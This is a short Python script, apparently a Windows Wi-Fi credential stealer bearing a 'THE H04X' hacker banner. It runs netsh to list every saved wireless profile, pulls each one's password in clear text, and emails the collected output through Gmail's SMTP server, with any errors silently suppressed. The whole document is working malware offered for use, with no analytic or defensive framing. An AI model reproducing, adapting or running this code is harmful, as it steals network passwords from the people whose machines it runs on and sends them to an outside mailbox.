try:
	import subprocess
	import re
	import smtplib
except:
	pass
"""
print(colored(r'''
    --------- |     | 0000000    /\    /\     0000   000000000000000000000000000000000000000000000000000000
        |     |_____| 0     0   /  \  /  \   0    0  0                       0000000     0000      00000000
        |     |     | 0     0  /    \/    \  000000  0000000                 0          0    0        0
        |     |     | 0000000 /            \ 0    0         0      \ THE /   0          000000        0
        |                    /              \               0        ___     0000000    0    0        0
        | 000000000000000000000000000000000000000000000000000                                         0
        |                                                                                             0
                                                        --- THE H04X
''',"red", )"""
def send_mail(email,passw,msgs):
    try:
        print(msgs)
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,passw)
        server.sendmail(email,email,msgs)
        server.quit()
    except:
        pass
def get_passwd():
    cmd = "netsh wlan show profile"
    networks_name = subprocess.check_output(cmd,shell=True)

    networks_name = networks_name.decode()

    names = re.findall('(?:Profile\s*:\s)(.*)',networks_name)

    names = [s.strip('\r') for s in names]
    profiles = " "

    for name in names:
        try:
            cmd = "netsh wlan show profile" + " " + str(name) + " " + "key=clear"
            passwd = subprocess.check_output(cmd,shell=True)
            passwd = passwd.decode()
            profiles =  profiles + "\n\n##############"+ passwd

        except:
            pass
    send_mail("","",profiles)

if __name__ == "__main__":

    get_passwd()




